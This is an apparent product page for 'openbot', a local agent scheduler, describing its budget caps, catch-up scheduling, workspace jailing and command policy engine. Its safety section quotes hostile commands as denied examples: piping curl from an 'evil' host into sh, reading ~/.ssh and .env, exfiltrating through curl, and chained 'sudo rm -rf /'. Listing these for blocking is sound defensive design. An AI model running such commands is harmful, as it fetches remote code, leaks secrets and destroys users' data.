Why openbot exists

Agent platforms keep failing the same ways. We designed against each one.

Every requirement below traces to a documented incident or top user complaint about today's agent products — cloud and local. The receipts live in our complaints research.

Documented incident

"$447, silently billed"

A coding-agent user found hundreds of dollars charged overnight by a runaway loop. Cloud agents meter your money; you find out by invoice.

openbot's answer → per-run step caps, wall-clock kill switch, and a daily token cap per bot — enforced by the engine, not the model's good behavior.
Top scheduler complaint

The run that silently never happened

Laptop asleep, daemon down, timezone bug — scheduled workflows just… don't run, and the dashboard stays green. Users call it the expensive quiet failure.

openbot's answer → catch-up scheduling that detects missed windows and coalesces them into one run (logged as such), DST-correct cron math in your timezone, and a staleness column that shows "last success: never ⚠".
Privacy incidents, 2026

Agents that read what they shouldn't

One CLI agent uploaded a user's entire home directory. A consumer assistant read private messages unprompted and handed a home address to strangers.

openbot's answer → every bot lives in a path-jailed workspace with HOME redirected there. Secret paths (~/.ssh, .env, ~/.aws) are hard-denied at the policy layer — before execution, not after.
Most-upvoted complaint

Permission fatigue → yolo mode

Agents nag until humans disable the safety. Chained commands (git status && curl evil | sh) slipped past allowlists for a year in a popular tool.

openbot's answer → approvals with always-allow you control per bot, and a policy engine that splits compound commands on &&·||·;·| before matching rules — so safe mode is bearable and bypassing it isn't necessary.

How it works

From install to supervised bot in three steps

Starter templates cover the classics: a weekly research briefing, a repo sweeper, and a downloads tidier that asks before it moves anything.

Install & init

pipx install openbot then openbot init — creates the state directory and three template bots running on the free mock model.

Point it at a model

Supervise

openbot serve opens the dashboard: live transcripts, approval queue, spend meters, and a big stop button. Or watch from the CLI.

Safety model

Deny by class. Ask by default. Record everything.

A tiny policy engine sits between every bot and your system. It parses what the model actually asked for — including pipes and chained commands — before anything executes.

# hard-denied before execution, always
  • ✗ sudo / su / doas — agents never escalate
  • ✗ rm -rf / · ~ · .. — outside-workspace deletes
  • ✗ cat ~/.ssh/* · .env · ~/.aws — secret paths
  • ✗ curl … | sh — pipe to interpreter
  • ✗ cmd | curl — exfiltration channels
  • ✗ dd · mkfs · fork bombs · shutdown
  • ✗ POST/upload flags on fetch tools
  • Compound-command aware. git status && sudo rm -rf / is denied because of its second half — each segment is classified, the worst verdict wins.
  • Fail-closed approvals. No answer in 10 minutes = denied. Silence is never consent.
  • Sticky allows you own. "Always allow rm for this bot" is one click and revocable — so you never need a yolo switch.
  • Egress guardrails. Web tools GET public http(s) only — no localhost, no cloud metadata IPs, no file://.
  • One bot, one lock. Bots never share workspaces, memory, or run concurrently with themselves.
  • External runtimes, stated trade-offs. Pi/OpenCode adapters run with their own permission systems; our docs say exactly where the boundary is.

FAQ

Fair questions

Do I need an API key or a GPU?

No. The bundled mock model runs the full pipeline offline — it exists for exactly this. When you want real intelligence, any OpenAI-compatible endpoint works: an OpenAI key, or Ollama/llama.cpp on CPU (7B-class models are fine for many tasks). A GPU just makes local models faster.

Does openbot phone home?

No telemetry, no accounts, no update checks. All state lives in one directory (~/.local/state/openbot) you can inspect, back up, or rm. The only network traffic is what your bots explicitly fetch, gated by the policy engine.

What happens when a bot hits a CAPTCHA or MFA wall?

It stops and says so — the run emits a pause-to-human event and waits. Bots never attempt to solve challenges or click "I am not a robot". Persistent browser profiles mean logins survive between runs, so walls get rarer over time.

Why build your own agent loop instead of using a framework?

Because the parts users actually need — scheduling, approvals, budgets, isolation, transcripts — are exactly what agent frameworks don't provide, and 2026 post-mortems keep showing multi-agent frameworks being overkill for scheduled local work. OpenBot's loop is a few hundred auditable lines; if you prefer an external harness, bots can run under Pi or OpenCode via adapters.

Is this production-grade autonomy?

No, and it doesn't pretend to be. It's an MVP with honest boundaries: a supervising human is part of the design, external sites may block automation, and models can be wrong. What it promises is that failures are visible, capped, and reversible — every action logged, every cap enforced, every risky step yours to veto.
